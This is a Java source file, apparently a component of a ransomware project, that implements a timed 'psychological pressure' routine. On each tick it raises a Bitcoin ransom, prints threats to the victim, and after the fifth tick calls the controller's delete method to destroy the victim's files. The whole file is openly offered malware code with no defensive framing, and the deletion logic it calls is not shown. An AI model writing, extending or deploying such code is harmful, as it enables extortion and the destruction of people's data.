import Ransomware.RansomWareController;

import java.util.TimerTask;

public class PsychologicalPressure extends TimerTask {
    private final RansomWareController ransomWareController;
    private float ransomAmount;
    private int counter;

    public PsychologicalPressure(float ransomAmount, RansomWareController ransomWareController) {
        this.ransomAmount = ransomAmount;
        counter = 0;
        this.ransomWareController = ransomWareController;
    }

    @Override
    public void run() {
        pressureTask();
    }

    public float getRansomAmount() {
        return ransomAmount;
    }

    public int getCounter() {
        return counter;
    }

    private void pressureTask() {
        ransomAmount += 0.01f;
        counter++;

        if (counter == 4) {
            System.out.println("Pay "+ ransomAmount + " BTC immediately or your files will be irrevocably deleted.");
        } else if (counter > 4) {
            System.out.println("Payment not arrived, your files will be irrevocably deleted");
            ransomWareController.delete();
        } else {
            System.out.println("Amount to pay increased by 0,01 to " + ransomAmount + " BTC.");
        }
    }
}
